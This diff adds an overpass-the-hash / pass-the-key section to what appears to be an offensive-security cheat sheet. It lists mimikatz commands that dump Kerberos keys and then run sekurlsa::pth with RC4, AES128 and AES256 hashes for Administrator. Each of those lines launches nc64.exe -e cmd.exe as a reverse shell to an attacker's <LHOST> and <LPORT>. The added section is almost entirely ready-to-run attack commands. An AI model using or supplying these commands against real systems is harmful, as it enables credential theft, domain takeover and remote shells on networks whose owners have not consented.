@@ -486,6 +486,31 @@ meterpreter > creds_all
 meterpreter > golden_ticket_create
 ```
 
+### Overpass-the-hash / Pass-the-Key
+
+```c
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+
+#### RC4
+
+```c
+mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
+```
+
+#### AES128
+
+```c
+mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
+```
+
+#### AES256
+
+```c
+mimikatz # sekurlsa::pth /user:Administrator /domain:<DOMAIN> /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"C:\nc64.exe -e cmd.exe <LHOST> <LPORT>"
+```
+
 ### Pass the Ticket
 
 ```c
